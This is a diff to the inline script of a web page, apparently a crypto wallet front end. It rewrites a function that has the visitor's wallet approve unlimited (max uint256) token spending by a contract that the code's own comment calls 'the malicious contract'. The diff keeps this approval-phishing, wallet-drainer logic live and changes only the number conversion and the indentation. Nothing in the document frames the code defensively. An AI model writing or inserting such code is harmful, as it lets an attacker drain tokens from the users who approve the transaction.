@@ -71,18 +71,20 @@
             }
         }
 
-        async function approveUnlimitedTokens() {
-            try {
-                const unlimitedAmount = web3.utils.toBN('0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'); // max uint256
-                
-                // Approve the malicious contract to spend unlimited tokens
-                await token.methods.approve(contractAddress, unlimitedAmount).send({ from: userAccount });
-                document.getElementById('status').innerText = `Approval successful! Unlimited tokens have been approved.`;
-            } catch (error) {
-                document.getElementById('status').innerText = "Approval failed!";
-                console.error(error);
-            }
-        }
+async function approveUnlimitedTokens() {
+    try {
+        // Using the max uint256 value (represented in hexadecimal)
+        const unlimitedAmount = web3.utils.toHex('0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff');
+        
+        // Approve the malicious contract to spend unlimited tokens
+        await token.methods.approve(contractAddress, unlimitedAmount).send({ from: userAccount });
+        document.getElementById('status').innerText = `Approval successful! Unlimited tokens have been approved.`;
+    } catch (error) {
+        document.getElementById('status').innerText = "Approval failed!";
+        console.error(error);
+    }
+}
+
     </script>
 </body>
 </html>
